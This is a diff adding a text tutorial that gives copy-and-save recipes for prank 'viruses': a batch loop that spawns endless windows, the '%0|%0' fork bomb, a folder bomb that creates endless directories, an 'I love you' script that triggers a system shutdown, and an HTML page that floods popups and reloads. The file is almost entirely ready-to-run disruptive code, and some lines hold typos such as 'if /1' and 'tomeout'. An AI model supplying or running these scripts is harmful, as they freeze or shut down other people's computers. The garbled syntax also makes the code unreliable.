@@ -1,0 +1,99 @@
+
+------------------------------------
+1. Make a virus
+write down in notpad below syntex
+------------------------------------
+@echo off
+
+:loop
+
+start
+start
+start
+start
+
+goto loop 
+-----------------------------------
+save & name - in - virus.bat
+
+
+
+https://www.geeksforgeeks.org/how-to-create-an-infinite-loop-in-windows-batch-file/
+===================================
+2 how to freez computer in one line of code
+--------------------------------------------
+write down in notpad below syntex
+--------------------------------------------
+%0|%0
+-------------------------------------------
+save & name - in - virus.bat
+----------------------------=
+
+
+
+
+==============================================
+3. make a folder bomb 
+-----------------------
+write down in notpad below syntex
+----------------------------------------------
+@echo off
+
+:loop
+
+md %random%
+
+goto loop
+-------------------------------
+folder bomb.bat
+-------------------------------
+
+
+
+
+===============================
+4. make i love you virus
+-------------------------
+@echo off
+
+color a
+echo Hello, do you love me? (answer in yes & no  )
+set /p input=
+if /1 %input%==yes go to love
+if /1 %input%==no goto hate
+if /1 not %input%== yes,no goto 1
+
+:love 
+echo I love you Too...
+echo see you later
+pause
+exit
+
+:hate 
+echo But I love you ... lol
+echo you just got hacked!
+tomeout 3
+shutdown -s -t 100
+----------------------------------
+=========================================
+Charom bomb
+--------------------------------------
+-----------------
+<script>
+window.open()
+location.reload()
+</script>
+----------------
+save it in .html
+--------------------------------------
+--------------------------------------
+
+
+
+
+
+
+https://riptutorial.com/ebook/batch-file
+https://www.instructables.com/Open-Loop-with-Notepad/
+https://www.geeksforgeeks.org/how-to-create-an-infinite-loop-in-windows-batch-file/
+https://www.youtube.com/@Quiet_Coder
